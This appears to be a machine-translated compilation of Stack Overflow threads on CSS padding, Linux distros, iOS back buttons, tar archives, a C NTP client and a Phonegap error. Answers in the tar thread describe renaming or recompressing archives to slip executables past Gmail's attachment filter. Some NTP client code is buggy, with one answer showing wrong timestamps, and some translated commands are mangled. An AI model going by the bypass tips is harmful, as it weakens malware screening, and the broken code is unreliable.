有没有办法控制跨度中间线内的填充？这有点难以解释，但也许我的[小提琴](https://jsfiddle.net/Mcd9F/39/)会帮助演示。因此，如果文本跨越 3 行，我可以在第一行的开头和最后一行的结尾添加填充，并在 CSS 中为跨度添加填充。但中间行的文字拥抱背景颜色。

我能不能像第一条和最后一条一样在中间线上填充？

目标看起来与此类似：

[![](../Images/a952b90baf2793fd41f98aa9d00a361c.png)](https://i.stack.imgur.com/FgULj.jpg)

```
<h1>
<span>I can pad the beginning of the first line and end of the last line, but middle lines hug the edge!</span>
</h1> 
```

```
h1{
    width:350px;
    margin: 5px;
    text-align: center;
}
h1 span
{
    background-color: #5577aa;
    color: #fff;
    line-height:32px;
    padding: 5px 25px 5px 35px;
    -moz-border-radius: 13px;
    font-size: 12pt;
    font-weight: bold;
    font-family: 'Arial', sans;
    text-align: center;
} 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-05-25T15:53:31.100

您不能随意添加边框半径或填充到自动换行，因为 HTML 元素实际上并没有结束。如果您想要图表中的内容，则需要使用三个元素。

# linux - 哪个 Linux 发行版最适合我？

> ID：10757563
> 
> 赞同：0
> 
> 时间：2012-05-25T15:50:32.930
> 
> 标签：linux

我需要使用 Linux 进行 Web 开发，我还想管理 Linux 服务器。那么这对我来说是最好的选择：

*   使用一个 Linux 发行版进行编程，另一个用于服务器。
*   为这两种目的使用一个 Linux 发行版，如果是这样，哪个 Linux 发行版对这两种目的都有好处？

有人可以给我一些建议吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-25T15:59:01.757

我可以建议您将 debian (http://www.debian.org/) 用于开发和生产环境，但这是我自己的偏好。

这是一个经典的问题，每个人都有自己的观点，没有人会赢……

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-05-25T15:54:03.100

[Ubuntu](http://www.ubuntu.com/)很容易使用，你可以使用 apt-get 来安装你需要的所有东西。

# iphone - iOS 5：如何实现自定义（图像）后退按钮

> ID：10757565
> 
> 赞同：12
> 
> 时间：2012-05-25T15:50:38.453
> 
> 标签：iphone, objective-c, ios, ios5, uibarbuttonitem

我已经在我的博客上完成了教程，所以我知道如何制作一个可以显示底部（堆栈）视图控制器标题的可拉伸按钮。但我希望做的是有图标（比如 HOME 的房子），没有文字，也没有调整大小。

使用我的自定义图像和下面的代码，我得到了一个标题在顶部（不需要）的拉伸版本（不需要），单击时它会着色/突出显示（很好）；

```
UIImage *backButtonImage = [UIImage imageNamed:@"backButton_30.png"];
[[UIBarButtonItem appearance] setBackButtonBackgroundImage:backButtonImage forState:UIControlStateNormal barMetrics:UIBarMetricsDefault]; 
```

[屏幕截图 1](https://imgur.com/U6fth)

现在，我在这里搜索并阅读了所有返回旧答案的类似问题，并且对我来说有奇怪的结果。这是我尝试过的代码；

```
 UIImage *backButtonImage = [UIImage imageNamed:@"backButton_30.png"];
  UIBarButtonItem *backButton = [[UIBarButtonItem alloc] initWithImage:backButtonImage style:UIBarButtonItemStyleBordered target:nil action:nil];
  self.navigationItem.backBarButtonItem = backButton; 
```

此方法不会拉伸我的自定义图像按钮（很好），也不会显示文本（我想要的）但是它下面仍然有原始的蓝色按钮（WTF），并且我的自定义按钮在单击时不会着色，只有它下面的蓝色按钮可以！

[屏幕截图 2](https://imgur.com/7cTpQ)

请帮忙，我错过了什么？

*更新

我通过使用可调整大小的图像对其进行了一些修复。这迫使它不要“伸展”

```
UIImage *backButtonHomeImage = [[UIImage imageNamed:@"backButtonHomeWhite_30.png"] resizableImageWithCapInsets:UIEdgeInsetsMake(0, 0, 0, 0)];
[[UIBarButtonItem appearance] setBackButtonBackgroundImage:backButtonHomeImage  forState:UIControlStateNormal barMetrics:UIBarMetricsDefault]; 
```

要修复按钮上显示的标题，我必须做

```
self.title =@" "; 
```

现在这是一个有点肮脏的修复，但它似乎正在工作。现在剩下的唯一问题是我想在不同的视图上使用不同的后退按钮，这种方法会造成一些麻烦；设置按钮的最后一个视图覆盖所有其他视图。所以最后，根据您在应用程序中导航的方式，返回上一个视图有错误的后退按钮，并且它永远不会重置为正确的。

更新 2：潜在的想法：

以下是一个合理的解决方案，还是可能破坏某些东西的黑客？

像这样隐藏默认的后退按钮，

```
[self.navigationItem setHidesBackButton:YES animated:NO]; 
```

...然后使用自定义 UIBarButtonItem，在我实际想要放置在后退按钮位置的样式中的按钮，在点击时向 UINavigationController 发送[popViewControllerAnimated:](https://developer.apple.com/library/ios/#documentation/UIKit/Reference/UINavigationController_Class/Reference/Reference.html#//apple_ref/doc/uid/TP40006934)消息。

如果您知道更强大的解决方案，请分享，谢谢。

* * *

## 回答 #1

> 赞同：13
> 
> 时间：2012-09-12T18:29:01.757

假设您当前的解决方案

```
UIImage *backButtonHomeImage = [[UIImage imageNamed:@"backButtonHomeWhite_30.png"] resizableImageWithCapInsets:UIEdgeInsetsMake(0, 0, 0, 0)];
[[UIBarButtonItem appearance] setBackButtonBackgroundImage:backButtonHomeImage  forState:UIControlStateNormal barMetrics:UIBarMetricsDefault]; 
```

您可以接受，所以剩下的唯一问题是当您在视图之间来回切换时如何更新该按钮的外观，一种可行的方法是在每个控制器的`viewWillAppear:`方法中执行上面的代码：

```
- (void)viewWillAppear:(BOOL)animated {
    UIImage *backButtonHomeImage = [[UIImage imageNamed:@"backButtonHomeWhite_30.png"] resizableImageWithCapInsets:UIEdgeInsetsMake(0, 0, 0, 0)];
    [[UIBarButtonItem appearance] setBackButtonBackgroundImage:backButtonHomeImage  forState:UIControlStateNormal barMetrics:UIBarMetricsDefault];
} 
```

如果您对当前的自定义方法不满意，可以`UIBarButtonItem`使用`initWithCustomView:`. `UIImageView`在这种情况下，您可以使用您喜欢的图像指定，例如，它应该可以工作：

```
UIBarButtonItem *backButton = [[UIBarButtonItem alloc] initWithCustomView:[UIImageView ...]]; 
```

希望这可以帮助。

* * *

## 回答 #2

> 赞同：9
> 
> 时间：2012-05-31T01:12:14.223

对于 iOS 5+ 使用`[[UIBarButtonItem appearance] setBackButtonBackgroundImage:[UIImage imageNamed:@"someimage.png"] forState:UIControlStateNormal barMetrics:UIBarMetricsDefault]`.

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2012-09-13T10:29:23.563

我在项目中使用的一些代码：

```
UIButton *btn = [UIButton buttonWithType:UIButtonTypeCustom];
UIImage *btnImg = [UIImage imageNamed:@"ButtonRetourInactive"];
[btn setImage:btnImg forState:UIControlStateNormal];

btn.frame = CGRectMake(0, 0, btnImg.size.width, btnImg.size.height);
[btn addTarget:self action:@selector(goBack:) forControlEvents:UIControlEventTouchUpInside];
self.navigationItem.leftBarButtonItem = [[[UIBarButtonItem alloc] initWithCustomView:btn] autorelease]; 
```

请注意，这也适用于 iOS 4 和 3。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-09-13T09:31:21.707

如果您使用故事板，它太容易了。取一个圆形矩形按钮并将其放在导航栏上。然后双击按钮（在选择时，起初它只显示条形按钮的属性，但通过选择两次，您可以更改其所有属性，就像您正在自定义常规 UI 按钮一样）。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-09-13T09:42:06.450

`UIAppearance`在这种情况下没有用。

我尝试使用： `- [UIBarButtonItem initWithCustomView:]`。您可以在此处的视图中添加背景图像和标题，随心所欲。

# linux - 如何发送包含可执行文件的压缩存档，以便 Google 的附件过滤器不会拒绝它

> ID：10757566
> 
> 赞同：63
> 
> 时间：2012-05-25T15:50:43.680
> 
> 标签：linux, compression, tar

我有一个要压缩以通过电子邮件发送的目录，我试过这个：

```
tar -cvf filename.tar.gz directory_to_compress/ 
```

但是当我尝试通过电子邮件发送它时，谷歌说：

```
filename.tar.gz contains an executable file. For security reasons, Gmail does not allow you to send this type of file. 
```

`tar.gz`如何从命令行将目录压缩到文件中？

* * *

## 回答 #1

> 赞同：129
> 
> 时间：2012-05-25T15:52:53.057

```
tar -cvzf filename.tar.gz directory_to_compress/ 
```

大多数`tar`命令都有`z`创建`gzip`ed 版本的选项。

虽然在我看来问题是如何绕过谷歌。我不确定重命名您的输出文件是否会欺骗 Google，但您可以尝试。IE，

```
tar -cvzf filename.bla directory_to_compress/ 
```

然后发送`filename.bla`- 内容将是一个压缩的 tar，所以在另一端它可以像往常一样被检索。

* * *

## 回答 #2

> 赞同：8
> 
> 时间：2013-07-03T14:58:36.690

要绕过谷歌的检查，这是您真正想要的，只需在发送文件时从文件中删除扩展名，并在下载后将其添加回来。例如：

*   tar czvf 文件.tar.gz 目录
*   mv file.tar.gz filetargz
*   [通过 gmail 发送 filetargz]
*   [下载文件targz]
*   [将filetargz重命名为file.tar.gz并打开]

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2013-12-03T13:20:43.780

绕过google检查的另一种简单方法是使用另一种tar压缩算法，例如bz2：

```
tar -cvjf my.tar.bz2 dir/ 
```

请注意，上面使用了“j”（用于 bz2 压缩）而不是“z”（gzip 压缩）。

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2012-05-25T15:54:32.210

尝试这个：

```
tar -czf my.tar.gz dir/ 
```

但是你确定你没有压缩一些 .exe 文件之类的吗？也许问题不在于压缩，而在于您正在压缩的文件？

# c - 如何编写NTP客户端？

> ID：10757575
> 
> 赞同：3
> 
> 时间：2012-05-25T15:51:03.023
> 
> 标签：c, ntp

我正在寻找用 C 编写的 NTP 客户端的代码示例。我发现[了这个](http://www.abnormal.com/~thogard/ntp/)：修复了代码上的一些东西，并且它能够编译。但是在“发送数据..”之后它什么也没有。我不知道如何解决这个问题。代码或服务器的问题在哪里？提前致谢。

```
/*
 * This code will query a ntp server for the local time and display
 * it.  it is intended to show how to use a NTP server as a time
 * source for a simple network connected device.
 * This is the C version.  The orignal was in Perl
 *
 * For better clock management see the offical NTP info at:
 * http://www.eecis.udel.edu/~ntp/
 *
 * written by Tim Hogard (thogard@abnormal.com)
 * Thu Sep 26 13:35:41 EAST 2002
 * Converted to C Fri Feb 21 21:42:49 EAST 2003
 * this code is in the public domain.
 * it can be found here http://www.abnormal.com/~thogard/ntp/
 *
 */
#include <stdio.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <time.h>
#include <string.h>

void ntpdate();

int main() {
    ntpdate();
    return 0;
}

void ntpdate() {
char    *hostname="tick.usno.navy.mil";
int portno=123;     //NTP is port 123
int maxlen=1024;        //check our buffers
int i;          // misc var i
unsigned char msg[48]={010,0,0,0,0,0,0,0,0};    // the packet we send
unsigned long  buf[maxlen]; // the buffer we get back
//struct in_addr ipaddr;        //  
struct protoent *proto;     //
struct sockaddr_in server_addr;
int s;  // socket
int tmit;   // the time -- This is a time_t sort of

//use Socket;
//
//#we use the system call to open a UDP socket
//socket(SOCKET, PF_INET, SOCK_DGRAM, getprotobyname("udp")) or die "socket: $!";
proto=getprotobyname("udp");
s=socket(PF_INET, SOCK_DGRAM, proto->p_proto);
if(s) {
    perror("asd");
    printf("socket=%d\n",s);
}
//
//#convert hostname to ipaddress if needed
//$ipaddr   = inet_aton($HOSTNAME);
memset( &server_addr, 0, sizeof( server_addr ));
server_addr.sin_family=AF_INET;
server_addr.sin_addr.s_addr = inet_addr(hostname);
//argv[1] );
//i   = inet_aton(hostname,&server_addr.sin_addr);
server_addr.sin_port=htons(portno);
//printf("ipaddr (in hex): %x\n",server_addr.sin_addr);

/*
 * build a message.  Our message is all zeros except for a one in the
 * protocol version field
 * msg[] in binary is 00 001 000 00000000 
 * it should be a total of 48 bytes long
*/

// send the data
printf("sending data..\n");
i=sendto(s,msg,sizeof(msg),0,(struct sockaddr *)&server_addr,sizeof(server_addr));

// get the data back
i=recv(s,buf,sizeof(buf),0);
printf("recvfr: %d\n",i);
//perror("recvfr:");

//We get 12 long words back in Network order
/*
for(i=0;i<12;i++)
    printf("%d\t%-8x\n",i,ntohl(buf[i]));
*/

/*
 * The high word of transmit time is the 10th word we get back
 * tmit is the time in seconds not accounting for network delays which
 * should be way less than a second if this is a local NTP server
 */

tmit=ntohl((time_t)buf[10]);    //# get transmit time
//printf("tmit=%d\n",tmit);

/*
 * Convert time to unix standard time NTP is number of seconds since 0000
 * UT on 1 January 1900 unix time is seconds since 0000 UT on 1 January
 * 1970 There has been a trend to add a 2 leap seconds every 3 years.
 * Leap seconds are only an issue the last second of the month in June and
 * December if you don't try to set the clock then it can be ignored but
 * this is importaint to people who coordinate times with GPS clock sources.
 */

tmit-= 2208988800U; 
//printf("tmit=%d\n",tmit);
/* use unix library function to show me the local time (it takes care
 * of timezone issues for both north and south of the equator and places
 * that do Summer time/ Daylight savings time.
 */

//#compare to system time
printf("Time: %s",ctime(&tmit));
i=time(0);
//printf("%d-%d=%d\n",i,tmit,i-tmit);
printf("System time is %d seconds off\n",i-tmit);
} 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-05-25T16:08:41.813

不确定 sendto() 是否阻塞。

要对此进行测试，您可能需要添加

```
printf("receiving data..\n"); 
```

在调用`recv()`.

* * *

呼叫也`recv()`可能会阻塞。

它等待`sizeof(buf)`字节，即`1024* sizeof(long)`.

从源代码中的评论中，我们了解到需要 12 个长词，因此您可以考虑`recv()`通过将调用更改为`recv()`like 来说明这一点：

```
i = recv(s, buf, 12*sizeof(buf[0]), 0); 
```

* * *

尽管如此，我还是强烈建议向系统调用添加错误检查，就像`sendo()`和`recv()`也是一样。为此，请测试它们返回的值是`-1`，如果是，则进行一些错误处理。

对于其他系统调用，其他值可能表示错误。详情请参阅`man <method name>`。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2013-11-05T14:34:40.140

这是一个运行良好的代码。（根本无法正常工作：时间戳错误 - 阅读我在此页面中发布的 android 帖子）。

感谢分享。

```
 /* This code will query a ntp server for the local time and display

 * it.  it is intended to show how to use a NTP server as a time
 * source for a simple network connected device.
 * This is the C version.  The orignal was in Perl
 *
 * For better clock management see the offical NTP info at:
 * http://www.eecis.udel.edu/~ntp/
 *
 * written by Tim Hogard (thogard@abnormal.com)
 * Thu Sep 26 13:35:41 EAST 2002
 * Converted to C Fri Feb 21 21:42:49 EAST 2003
 * this code is in the public domain.
 * it can be found here http://www.abnormal.com/~thogard/ntp/
 *
 */
#include <stdio.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <time.h>
#include <string.h>

void ntpdate();

int main() {
    ntpdate();
    return 0;
}

void ntpdate() {
char *hostname="163.117.202.33";
int portno=123;     //NTP is port 123
int maxlen=1024;        //check our buffers
int i;          // misc var i
unsigned char msg[48]={010,0,0,0,0,0,0,0,0};    // the packet we send
unsigned long  buf[maxlen]; // the buffer we get back
//struct in_addr ipaddr;        //  
struct protoent *proto;     //
struct sockaddr_in server_addr;
int s;  // socket
int tmit;   // the time -- This is a time_t sort of

//use Socket;
//
//#we use the system call to open a UDP socket
//socket(SOCKET, PF_INET, SOCK_DGRAM, getprotobyname("udp")) or die "socket: $!";
proto=getprotobyname("udp");
s=socket(PF_INET, SOCK_DGRAM, proto->p_proto);
perror("socket");
//
//#convert hostname to ipaddress if needed
//$ipaddr   = inet_aton($HOSTNAME);
memset( &server_addr, 0, sizeof( server_addr ));
server_addr.sin_family=AF_INET;
server_addr.sin_addr.s_addr = inet_addr(hostname);
//argv[1] );
//i   = inet_aton(hostname,&server_addr.sin_addr);
server_addr.sin_port=htons(portno);
//printf("ipaddr (in hex): %x\n",server_addr.sin_addr);

/*
 * build a message.  Our message is all zeros except for a one in the
 * protocol version field
 * msg[] in binary is 00 001 000 00000000 
 * it should be a total of 48 bytes long
*/

// send the data
printf("sending data..\n");
i=sendto(s,msg,sizeof(msg),0,(struct sockaddr *)&server_addr,sizeof(server_addr));
perror("sendto");
// get the data back
struct sockaddr saddr;
socklen_t saddr_l = sizeof (saddr);
i=recvfrom(s,buf,48,0,&saddr,&saddr_l);
perror("recvfr:");

//We get 12 long words back in Network order
/*
for(i=0;i<12;i++)
    printf("%d\t%-8x\n",i,ntohl(buf[i]));
*/

/*
 * The high word of transmit time is the 10th word we get back
 * tmit is the time in seconds not accounting for network delays which
 * should be way less than a second if this is a local NTP server
 */

tmit=ntohl((time_t)buf[10]);    //# get transmit time
//printf("tmit=%d\n",tmit);

/*
 * Convert time to unix standard time NTP is number of seconds since 0000
 * UT on 1 January 1900 unix time is seconds since 0000 UT on 1 January
 * 1970 There has been a trend to add a 2 leap seconds every 3 years.
 * Leap seconds are only an issue the last second of the month in June and
 * December if you don't try to set the clock then it can be ignored but
 * this is importaint to people who coordinate times with GPS clock sources.
 */

tmit-= 2208988800U; 
//printf("tmit=%d\n",tmit);
/* use unix library function to show me the local time (it takes care
 * of timezone issues for both north and south of the equator and places
 * that do Summer time/ Daylight savings time.
 */

//#compare to system time
printf("Time: %s",ctime(&tmit));
i=time(0);
//printf("%d-%d=%d\n",i,tmit,i-tmit);
printf("System time is %d seconds off\n",i-tmit);
} 
```

这里的输出：

```
$ ./sntp_client 
socket: Success
sending data..
sendto: Success
recvfr:: Success
Time: Sun Sep 26 16:00:32 4213
System time is -702316565 seconds off 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-05-28T11:25:47.990

这是我修改并编译和执行的代码。
它在服务器 2003、VS 2008 上进行了测试。这是您提供的 Unix 的 Windows 等效代码

```
#include <stdio.h>
//#include <sys/types.h>
//#include <sys/socket.h>
//#include <netinet/in.h>
//#include <arpa/inet.h>
//#include <netdb.h>
#include <time.h>
#include <string.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <tchar.h>

#pragma comment(lib, "Ws2_32.lib")

void ntpdate();

int main() {
    ntpdate();
    return 0;
}

void ntpdate() {
char    *hostname="64.27.26.1";//"tick.usno.navy.mil";
int portno=123;     //NTP is port 123
int maxlen=1024;        //check our buffers
long i;          // misc var i
char msg[48]={010,0,0,0,0,0,0,0,0};    // the packet we send
char  *buf = new char[1024]; // the buffer we get back
//struct in_addr ipaddr;        //  
struct protoent *proto;     //
struct sockaddr_in server_addr;
SOCKET s;  // socket
time_t tmit;   // the time -- This is a time_t sort of

//=====================================================================================
//THIS IS WHAT IS MISSING MAJORILY  
//=====================================================================================
        //Initialise the winsock stack
        WSADATA wsaData;
        BYTE wsMajorVersion = 1;
        BYTE wsMinorVersion = 1;
        WORD wVersionRequested = MAKEWORD(wsMinorVersion, wsMajorVersion);   
        if (WSAStartup(wVersionRequested, &wsaData) != 0) 
        {
            _tprintf(_T("Failed to load winsock stack\n"));
            WSACleanup();
            return;
        }
        if (LOBYTE(wsaData.wVersion) != wsMajorVersion || HIBYTE(wsaData.wVersion) != wsMinorVersion)
        {
            _tprintf(_T("Winsock stack does not support version which this program requires\n"));
            WSACleanup();
            return;
        }
//=====================================================================================

//use Socket;
//
//#we use the system call to open a UDP socket
//socket(SOCKET, PF_INET, SOCK_DGRAM, getprotobyname("udp")) or die "socket: $!";
proto=getprotobyname("udp");
int err = GetLastError();
s=socket(PF_INET, SOCK_DGRAM, proto->p_proto);
if(s) {
    perror("asd");
    printf("socket=%d\n",s);
}
//
//#convert hostname to ipaddress if needed
//$ipaddr   = inet_aton($HOSTNAME);
memset( &server_addr, 0, sizeof( server_addr ));
server_addr.sin_family=AF_INET;
server_addr.sin_addr.s_addr = inet_addr(hostname);
//argv[1] );
//i   = inet_aton(hostname,&server_addr.sin_addr);
server_addr.sin_port=htons(portno);
//printf("ipaddr (in hex): %x\n",server_addr.sin_addr);

/*
 * build a message.  Our message is all zeros except for a one in the
 * protocol version field
 * msg[] in binary is 00 001 000 00000000 
 * it should be a total of 48 bytes long
*/

// send the data
printf("sending data..\n");
i=sendto(s,msg,sizeof(msg),0,(struct sockaddr *)&server_addr,sizeof(server_addr));

int iResult = -1;
    // Receive until the peer closes the connection
    //do {

        iResult = recv(s, buf, 1024, 0);
        if ( iResult > 0 )
            printf("Bytes received: %d\n", iResult);
        else if ( iResult == 0 )
            printf("Connection closed\n");
        else
            printf("recv failed: %d\n", WSAGetLastError());

    //} while( iResult > 0 );

/*
 * The high word of transmit time is the 10th word we get back
 * tmit is the time in seconds not accounting for network delays which
 * should be way less than a second if this is a local NTP server
 */

tmit=ntohl((time_t)buf[10]);    //# get transmit time
//printf("tmit=%d\n",tmit);

/*
 * Convert time to unix standard time NTP is number of seconds since 0000
 * UT on 1 January 1900 unix time is seconds since 0000 UT on 1 January
 * 1970 There has been a trend to add a 2 leap seconds every 3 years.
 * Leap seconds are only an issue the last second of the month in June and
 * December if you don't try to set the clock then it can be ignored but
 * this is importaint to people who coordinate times with GPS clock sources.
 */

tmit -= 2208988800U; 
//printf("tmit=%d\n",tmit);
/* use unix library function to show me the local time (it takes care
 * of timezone issues for both north and south of the equator and places
 * that do Summer time/ Daylight savings time.
 */

//#compare to system time
printf("Time: %s",ctime(&tmit));
i=time(0);
//printf("%d-%d=%d\n",i,tmit,i-tmit);
printf("System time is %d seconds off\n",i-tmit);
} 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-11-05T14:18:43.327

您应该使用：`recvfrom()`任何 POSIX 兼容系统上的 POSIX libc 中的函数，就像 Unix 一样。或包含 Windows。因为它支持一些基本的 POSIX 功能。

阅读使用 UDP 套接字的手册，而不是面向连接的。他们有些特别。

祝你今天过得愉快。并希望我的帖子对你有所帮助。

干杯;

阿贝尔。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2013-11-06T15:21:54.297

在这里，您有一个完整的 NTP 客户端，我昨天根据您的代码编写了代码。

谢邀；）

它已移植到 android，因此您必须更改一些函数以使其在 linux 下工作并取消注释某些 main()，不是吗？

```
 /* This code will query a ntp server for the local time and display
 * it.  it is intended to show how to use a NTP server as a time
 * source for a simple network connected device.
 * This is the C version.  The orignal was in Perl
 *
 * For better clock management see the offical NTP info at:
 * http://www.eecis.udel.edu/~ntp/
 *
 * written by Tim Hogard (thogard@abnormal.com)
 * Thu Sep 26 13:35:41 EAST 2002
 * Converted to C Fri Feb 21 21:42:49 EAST 2003
 * this code is in the public domain.
 * it can be found here http://www.abnormal.com/~thogard/ntp/
 *
 * ported to android 4.3 on mar/nov/5 - 2013 by abel.
 * the same day ported to a library for agpsd layer.
 */
/*
#include <stdio.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <time.h>
#include <string.h>
#include <utils/SystemClock.h>
#include <stdlib.h>
#include <unistd.h>
#include <errno.h>
#include <math.h>
#include <sys/time.h>
#define NTP_MODE_CLIENT 3
#define NTP_VERSION 3
#define TRANSMIT_TIME_OFFSET 40
#define REFERENCE_TIME_OFFSET 16
#define ORIGINATE_TIME_OFFSET 24
#define RECEIVE_TIME_OFFSET 32
#define OFFSET_1900_TO_1970 ((uint64_t)((365 * 70) + 17) * 24 * 60 * 60)
*/
void ntpdate(uint64_t *cachedTime, uint64_t *cachedTimeRef, uint64_t *cacheCertainty);
/*
int main() {
    uint64_t cachedTime, cachedTimeRef, cacheCertainty;
    ntpdate(&cachedTime, &cachedTimeRef, &cacheCertainty);
    printf ("%lld\n, %lld\n, %lld\n", cachedTime, cachedTimeRef, cacheCertainty);
    return 0;
}
*/
double random2 () {
    srandom(time(NULL));
    return random();
}

uint64_t currentTimeMillis(/*long int seconds, long int miliseconds*/) {
    struct timeval te; 
    gettimeofday(&te, NULL); // get current time
    uint64_t millis = (uint64_t) te.tv_sec * 1000 + floor(te.tv_usec / 1000); // caculate milliseconds
//  printf ("millis: %llu\n", millis);
    return millis;
}

uint32_t read32(char* buffer, int offset) {
    char b0 = buffer[offset];
    char b1 = buffer[offset+1];
    char b2 = buffer[offset+2];
    char b3 = buffer[offset+3];

    // convert signed bytes to unsigned values
    uint32_t i0 = ((b0 & 0x80) == 0x80 ? (b0 & 0x7F) + 0x80 : b0);
    uint32_t i1 = ((b1 & 0x80) == 0x80 ? (b1 & 0x7F) + 0x80 : b1);
    uint32_t i2 = ((b2 & 0x80) == 0x80 ? (b2 & 0x7F) + 0x80 : b2);
    uint32_t i3 = ((b3 & 0x80) == 0x80 ? (b3 & 0x7F) + 0x80 : b3);

    uint32_t v = (i0 << 24) + (i1 << 16) + (i2 << 8) + i3;
    return v;
}

uint64_t readTimeStamp(char *buffer, int offset) {
    uint32_t seconds  = read32(buffer, offset);
    uint32_t fraction = read32(buffer, offset + 4);
    uint64_t v = ((int64_t)seconds - OFFSET_1900_TO_1970) * 1000 + (int64_t) fraction * 1000 / (int64_t) 0x100000000;
//  printf ("%llu\n", v);
    return v;
}

void writeTimeStamp(char* buffer, int offset, long long int time) {
    uint64_t seconds = floor (time / 1000);
    uint64_t milliseconds = time - (uint64_t) seconds * 1000;
    seconds += OFFSET_1900_TO_1970;

    // write seconds in big endian format
    buffer[offset++] = (char)(seconds >> 24);
    buffer[offset++] = (char)(seconds >> 16);
    buffer[offset++] = (char)(seconds >> 8);
    buffer[offset++] = (char)(seconds >> 0);

    uint64_t fraction = round ((uint64_t)milliseconds * 0x100000000 / 1000);
    // write fraction in big endian format
    buffer[offset++] = (char)(fraction >> 24);
    buffer[offset++] = (char)(fraction >> 16);
    buffer[offset++] = (char)(fraction >> 8);
    // low order bits should be random data
    buffer[offset++] = (char)(random2() * 255.0);
}

void ntpdate(uint64_t *cachedTime, uint64_t *cachedTimeRef, uint64_t *cacheCertainty) {
    char hostname[]="81.184.154.182";
    int portno=123;     //NTP is port 123
    int maxlen=48;        //check our buffers
    int i;          // misc var i
    uint64_t requestTime = currentTimeMillis();
    uint64_t requestTicks = android::elapsedRealtime();
    char msg[48];
    memset (msg,0,sizeof(msg));
    msg[0]= NTP_MODE_CLIENT | (NTP_VERSION << 3);
    writeTimeStamp(msg, TRANSMIT_TIME_OFFSET, requestTime);
    char  buf[maxlen]; // the buffer we get back
    struct sockaddr_in server_addr;
    int s;  // socket
    time_t tmit;   // the time -- This is a time_t sort of

    s=socket(PF_INET, SOCK_DGRAM, IPPROTO_UDP);
    memset( &server_addr, 0, sizeof( server_addr ));
    server_addr.sin_family=AF_INET;
    server_addr.sin_addr.s_addr = inet_addr(hostname);
    server_addr.sin_port=htons(portno);

    i=sendto(s,msg,sizeof(msg),0,(struct sockaddr *)&server_addr,sizeof(server_addr));
    struct sockaddr saddr;
    socklen_t saddr_l = sizeof (saddr);
    i=recvfrom(s,buf,sizeof(buf),0,&saddr,&saddr_l);

    uint64_t responseTicks = android::elapsedRealtime();
    uint64_t responseTime = requestTime + (responseTicks - requestTicks);
    uint64_t originateTime = readTimeStamp(buf, ORIGINATE_TIME_OFFSET);
    uint64_t receiveTime = readTimeStamp(buf, RECEIVE_TIME_OFFSET);
    uint64_t transmitTime = readTimeStamp(buf, TRANSMIT_TIME_OFFSET);
    uint64_t roundTripTime = responseTicks - requestTicks - (transmitTime - receiveTime);
    int32_t clockOffset = ((receiveTime - originateTime) + (transmitTime - responseTime))/2;
    //printf ("%lld + %lld = %ld %ld\n", (receiveTime - originateTime), (transmitTime - responseTime), (receiveTime - originateTime + transmitTime - responseTime)/2, clockOffset);
    uint64_t mNtpTime = responseTime + clockOffset;
    uint64_t mNtpTimeReference = responseTicks;
    uint64_t mRoundTripTime = roundTripTime;
    uint64_t mCachedNtpTime = mNtpTime;
    uint64_t mCachedNtpElapsedRealtime = mNtpTimeReference;
    uint64_t mCachedNtpCertainty = mRoundTripTime / 2;
    *cachedTime     = mCachedNtpTime;
    *cachedTimeRef  = mNtpTimeReference;
    *cacheCertainty = mCachedNtpCertainty;

//  uint64_t now = mNtpTime + android::elapsedRealtime() - mNtpTimeReference;
/*
    printf ("%lld\n", now);
    i=currentTimeMillis();
    printf("System time is %lu miliseconds off\n",i-now);
*/
} 
```

# facebook - Facebook 上的 NetworkOnMainThreadException 使用 Phonegap 1.6.0 登录

> ID：10757577
> 
> 赞同：7
> 
> 时间：2012-05-25T15:51:07.747
> 
> 标签：facebook, exception, cordova, networkonmainthread

我目前正在使用 Phonegap 1.6.0 和 Sencha Touch 1.1 创建一个应用程序。最近，在安卓 4.0.4 的智能手机上进行测试时，我们发现 Facebook 登录并没有像预期的那样工作。我们正在使用位于[此处](https://github.com/davejohnson/phonegap-plugin-facebook-connect)的 Phonegap Facebook 插件和 Cordova 的补丁。发生的情况是，一旦我们尝试在具有 Android Honeycomb 或更高版本的智能手机上登录 Facebook，应用程序将启动 NetworkOnMainThreadException，因为主线程上不允许网络操作。此异常仅在 Android Honeycomb 或更高版本上抛出，这就是我们在 2.3.3 上没有注意到它的原因。调用 FB.login() 时抛出异常且未到达回调。

我检查了各种主题和主题，但都非常模糊。我知道我必须在单独的线程中运行网络操作，但**我不确定应该如何完成**。线程似乎发生在 Java 中，但我根本没有使用任何 Java，所以在乱搞不是我写的代码之前，我需要一些帮助。

稍后我将尝试缩小导致异常的部分。任何帮助，将不胜感激。

错误堆栈：

```
05-25 15:42:29.018: I/Web Console(3785): Cordova Facebook Connect plugin initialized successfully. at file:///android_asset/www/cdv-plugin-fb-connect.js:24
05-25 15:42:29.120: D/OpenGLRenderer(3785): Flushing caches (mode 0)
05-25 15:42:30.479: D/ConnectPlugin(3785): authorized
05-25 15:42:30.479: D/ConnectPlugin(3785): Bundle[{expires_in=5177550, access_token=censored, code=censored}]
05-25 15:42:30.503: D/AndroidRuntime(3785): Shutting down VM
05-25 15:42:30.503: W/dalvikvm(3785): threadid=1: thread exiting with uncaught exception (group=0x40a671f8)
05-25 15:42:30.511: E/AndroidRuntime(3785): FATAL EXCEPTION: main
05-25 15:42:30.511: E/AndroidRuntime(3785): java.lang.RuntimeException: Failure delivering result ResultInfo{who=null, request=32665, result=-1, data=Intent { (has extras) }} to activity {com.company.product/com.company.product.productActivity}: android.os.NetworkOnMainThreadException
